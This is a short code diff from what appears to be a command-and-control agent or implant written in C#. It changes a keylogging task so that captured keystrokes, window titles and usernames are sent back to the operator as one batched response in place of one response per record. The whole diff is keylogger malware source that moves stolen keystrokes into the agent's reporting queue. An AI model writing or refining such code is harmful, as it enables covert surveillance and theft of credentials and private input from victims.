@@ -60,15 +60,10 @@ namespace Tasks
                     KeylogInformation[] keylogs = _keylogs.Flush();
                     if (keylogs.Length > 0)
                     {
-                        ST.Parallel.ForEach(keylogs, keylog =>
+                        _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse
                         {
-                            _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse
-                            {
-                                TaskID = _data.ID,
-                                WindowTitle = keylog.WindowTitle,
-                                Keystrokes = keylog.Keystrokes,
-                                User = keylog.Username
-                            });
+                            TaskID = _data.ID,
+                            Keylogs = keylogs
                         });
                     }
                 }
